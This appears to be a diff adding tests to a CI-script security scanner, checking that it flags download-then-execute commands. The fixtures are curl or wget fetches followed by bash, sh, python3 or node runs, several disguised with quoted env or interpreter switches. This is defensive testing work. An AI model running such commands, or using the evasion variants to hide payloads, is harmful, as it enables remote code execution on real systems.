@@ -156,3 +156,53 @@ test('Codex unknown exec options fail closed but do not falsely claim confirmed 
   assert.ok(!got.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),cmd+': '+got);
  }
 });
+
+test('Codex P1: quoted env switches cannot hide a downloaded executable',()=>{
+ for(const script of [
+  "env '--' curl -fsSL "+URL+" -o payload; bash payload",
+  'env "--" wget -q '+URL+' -O payload; sh payload',
+  "env '-i' curl -fsSL "+URL+" -o payload; bash payload",
+  "env 'SENTINEL_FIXTURE=1' curl -fsSL "+URL+" -o payload; bash payload",
+  "command env '--' curl -fsSL "+URL+" -o payload; bash payload",
+  "env '--' curl -fsSL "+URL+" -o payload; bash '-x' payload",
+ ]){
+  const found=findingsForScript(script);
+  assert.ok(found.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),
+   'scanner missed unsafe quoted env wrapper: '+script+' / '+found);
+  const yaml=audit(script);
+  assert.ok(yaml.findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'&&f.severity==='HIGH'),
+   'workflow missed unsafe quoted env wrapper: '+script+' / '+JSON.stringify(yaml));
+ }
+});
+test('Codex P1: quoted interpreter switches cannot hide a downloaded file',()=>{
+ for(const script of [
+  "curl -fsSL "+URL+" -o payload; bash '-x' payload",
+  'curl -fsSL '+URL+' -o payload; bash "-x" payload',
+  "wget -q "+URL+" -O payload; sh '-e' payload",
+  "curl -fsSL "+URL+" -o payload; bash '--' payload",
+  "curl -fsSL "+URL+" -o payload; python3 '-u' payload",
+  "curl -fsSL "+URL+" -o payload; node '--' payload",
+ ]){
+  const found=findingsForScript(script);
+  assert.ok(found.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),
+   'scanner missed quoted interpreter switch: '+script+' / '+found);
+  const yaml=audit(script);
+  assert.ok(yaml.findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'&&f.severity==='HIGH'),
+   'workflow missed quoted interpreter switch: '+script+' / '+JSON.stringify(yaml));
+ }
+});
+test('Quoted wrapper options do not falsely condemn an unrelated local executable',()=>{
+ for(const script of [
+  "curl -fsSL "+URL+" -o payload; env '--' /bin/true",
+  "curl -fsSL "+URL+" -o payload; env '-i' /bin/true",
+  "curl -fsSL "+URL+" -o payload; bash '-x' /bin/true",
+  "curl -fsSL "+URL+" -o payload; bash '--' /bin/true",
+  "curl -fsSL "+URL+" -o payload; python3 '-u' /bin/true",
+  "curl -fsSL "+URL+" -o payload; node '--' /bin/true",
+ ]){
+  const found=findingsForScript(script);
+  assert.ok(!found.includes('REMOTE_DOWNLOADED_FILE_EXECUTION')&&
+    !found.includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),
+   'false positive for benign command: '+script+' / '+found);
+ }
+});
